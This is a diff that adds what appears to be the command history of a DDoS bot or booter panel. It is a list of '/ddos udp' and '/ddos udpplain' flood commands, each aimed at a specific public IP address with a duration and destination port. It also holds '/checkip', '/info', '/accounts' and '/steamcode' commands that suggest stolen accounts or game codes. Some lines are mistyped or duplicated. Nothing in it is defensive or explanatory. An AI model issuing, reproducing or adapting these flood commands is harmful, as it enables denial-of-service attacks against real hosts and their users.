@@ -1,0 +1,52 @@
+/ddos udp 18.184.18.188 10 dport=9051
+/checkip 217.121.42.249
+/ddos udpplain 35.180.152.132 60 dport=9016
+/ddos udpplain /ddos udpplain 35.180.152.132 60 dport=9016 60 dport=9016
+/ddos udpplain 192.168.2.17 60 dport=9016
+/ddos udpplain35.180.152.132 20 dport=9016
+/ddos udpplain 35.180.152.132 20 dport=9016
+/ddos udpplain 35.180.152.132 5 dport=9016
+/accounta
+/accounts
+/steamcode
+/ddos udpplain 18.156.5.243  80 dport=9006
+/ddos udpplain 18.156.5.243  80 dport=/ddos udpplain 18.156.5.243  80 dport=9006
+/ddos udpplain 18.156.5.243  80 dport=49807
+/ddos udpplain 18.156.5.243  80 dport=9006
+/info
+/ddos udp 18.194.139.160 dport=9004
+/ddos udp 35.178.178.78 10 dport=9083
+/ddos udp  192.168.2.7 10 dport=8009
+/ddos udp 35.178.178.78 10 dport=9083
+/ddos udp 192.168.2.7 10 dport=8009
+/info 195.121.71.13
+/ddos udp 35.178.178.78 10 dport=9083
+/ddos udp 35.178.178.78 20 dport=9083
+/ddos udp 35.178.178.78 20 dport=9083
+/ddos udp 192.168.2.17 20 dport=9083
+/ddos udpplain 18.156.166.172  10dport=9026
+/ddos udpplain 18.156.166.172  10 dport=9026
+/ddos udpplain 3.127.79.86  10 dport=9010
+/ddos udpplain 3.127.79.86  120 dport=9010
+/ddos udpplain 3.127.79.86  120 dport=9010
+/ddos udpplain 3.127.79.86  120 dport=9010
+/ddos udpplain 52.28.231.231  120 dport=9009
+/ddos udpplain 52.28.231.231  300 dport=9009
+/ddos udpplain 35.157.98.133 100 dport=9005
+/ddos udpplain 18.130.247.175 10 dport=9021
+/ddos udpplain 18.130.247.175 10 dport=9021
+/ddos udpplain 18.130.173.191 20 dport=9005
+/ddos udp 35.180.208.78 20 dport=9045
+/ddos udpplain 35.180.208.78 20 dport=9045
+/ddos udpplain 35.180.208.78 20 dport=9045
+/ddos udpplain 35.180.208.78 20 dport=9045
+/ddos udp 31.13.64.52 10 dport=443
+/ddos udp 3.127.27.15
+ 120 dport=9004
+/ddos udp 3.127.27.15 10 dport=9004
+/ddos udp 3.127.27.15 10 dport=9004
+/ddos udp 192.168.2.17 10 dport=9003
+/ddos udp 192.168.2.17 10 dport=9004
+/ddos ud[ 35.178.192.102 10 d[prt=9004
+/ddos udp 35.178.192.102 dport=9004
+/ddos udp 35.178.192.102 10 dport=9004
